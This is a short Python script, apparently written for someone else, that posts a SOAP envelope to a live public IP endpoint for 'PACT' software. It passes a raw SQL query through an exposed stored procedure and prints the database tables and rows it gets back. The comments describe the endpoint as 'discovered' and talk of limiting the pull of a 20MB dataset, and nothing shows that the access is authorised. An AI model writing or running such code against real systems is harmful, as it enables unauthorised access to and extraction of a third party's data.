import requests
import xml.etree.ElementTree as ET

# The live public cloud endpoint you discovered
url = "http://86.96.206.105:121/PactWebService.svc"

# The exact SOAP envelope the PACT software uses to execute a SQL query
# I added a 'TOP 5' to the SELECT statement just for testing so it doesn't download 20MB right away
payload = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
    <s:Header>
        <a:Action s:mustUnderstand="1">http://tempuri.org/IPactWebService/Get</a:Action>
        <a:To s:mustUnderstand="1">http://86.96.206.105:121/PactWebService.svc</a:To>
    </s:Header>
    <s:Body>
        <Get xmlns="http://tempuri.org/">
            <CompanyIndex>1</CompanyIndex>
            <param xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
<b:anyType i:type="c:string" xmlns:c="http://www.w3.org/2001/XMLSchema">SELECT name FROM sys.tables ORDER BY name</b:anyType>
                <b:anyType i:type="c:int" xmlns:c="http://www.w3.org/2001/XMLSchema">10048</b:anyType>
                <b:anyType i:type="c:int" xmlns:c="http://www.w3.org/2001/XMLSchema">1</b:anyType>
            </param>
            <spName>spADM_GetDataSet</spName>
        </Get>
    </s:Body>
</s:Envelope>"""

headers = {
    'Content-Type': 'application/soap+xml; charset=utf-8',
    'Accept-Encoding': 'gzip, deflate'  # This tells the server to zip it, and Python requests will auto-unzip it!
}

print("Initiating secure connection to PACT database...")
response = requests.post(url, data=payload, headers=headers)

if response.status_code == 200:
    print("Success! Data received and decoded.\n")

    # Parse the raw XML string into a searchable tree
    root = ET.fromstring(response.text)

    # Loop through the XML tree looking for the row elements (labeled <Table>)
    row_count = 0
    for elem in root.iter():
        # Strip out the messy SOAP namespaces to just find the 'Table' tags
        if elem.tag.split('}')[-1] == 'Table':
            row_count += 1
            print(f"--- Record {row_count} ---")

            # Loop through every column inside this specific row
            for column in elem:
                col_name = column.tag.split('}')[-1]
                col_value = column.text
                print(f"{col_name}: {col_value}")

            print("\n")
else:
    print(f"Connection failed. Status Code: {response.status_code}")
    print(response.text)